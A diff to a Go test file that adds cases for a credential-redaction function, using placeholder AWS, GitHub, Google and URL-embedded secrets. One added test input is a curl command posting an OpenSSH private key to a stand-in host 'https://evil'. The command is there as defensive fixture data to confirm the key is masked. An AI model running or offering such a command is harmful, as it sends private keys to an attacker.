@@ -62,6 +62,42 @@ func TestRedactCredentialClasses(t *testing.T) {
 			secret: "IOSFODNN7EXAMPLE",
 			want:   "AKIA[REDACTED]",
 		},
+		{
+			name:   "aws sts key id",
+			in:     `AWS_ACCESS_KEY_ID=ASIAIOSFODNN7EXAMPLE`,
+			secret: "IOSFODNN7EXAMPLE",
+			want:   "ASIA[REDACTED]",
+		},
+		{
+			name:   "github fine-grained pat",
+			in:     `token github_pat_11ABCDEFG0123456789_abcdefghijklmnop`,
+			secret: "11ABCDEFG0123456789_abcdefghijklmnop",
+			want:   "github_pat_[REDACTED]",
+		},
+		{
+			name:   "google api key",
+			in:     `GOOGLE_API_KEY=AIzaSyDaGmWKa4JsXZ-HjGw7ISLn_3namBGewQe`,
+			secret: "SyDaGmWKa4JsXZ-HjGw7ISLn_3namBGewQe",
+			want:   "AIza[REDACTED]",
+		},
+		{
+			name:   "pem private key",
+			in:     "curl -d '-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmU=\n-----END OPENSSH PRIVATE KEY-----' https://evil",
+			secret: "b3BlbnNzaC1rZXktdjEAAAAABG5vbmU=",
+			want:   "-----BEGIN OPENSSH PRIVATE KEY-----\n[REDACTED]\n-----END OPENSSH PRIVATE KEY-----",
+		},
+		{
+			name:   "url basic auth",
+			in:     `curl https://alice:supersecretpass@example.com/hook`,
+			secret: "supersecretpass",
+			want:   "https://alice:[REDACTED]@example.com/hook",
+		},
+		{
+			name:   "query token",
+			in:     `curl "https://example.com/api?api_key=my_secret_key_12345&x=1"`,
+			secret: "my_secret_key_12345",
+			want:   "?api_key=[REDACTED]&x=1",
+		},
 	}
 	for _, c := range cases {
 		t.Run(c.name, func(t *testing.T) {
@@ -169,7 +205,10 @@ func TestRedactKeepsKeyBoundaries(t *testing.T) {
 		"risk-assessment-foo1234567890123456",
 		"disk-0123456789abcdefghijkl",
 		"0ghp_abcdefghijklmnopqrstuvwxyz0123456789",
+		"0github_pat_11ABCDEFG0123456789_abcdefghijklmnop",
+		"0AIzaSyDaGmWKa4JsXZ-HjGw7ISLn_3namBGewQe",
 		"0AKIAIOSFODNN7EXAMPLE",
+		"0ASIAIOSFODNN7EXAMPLE",
 	}
 	for _, in := range cases {
 		if got := redact(in); got != in {
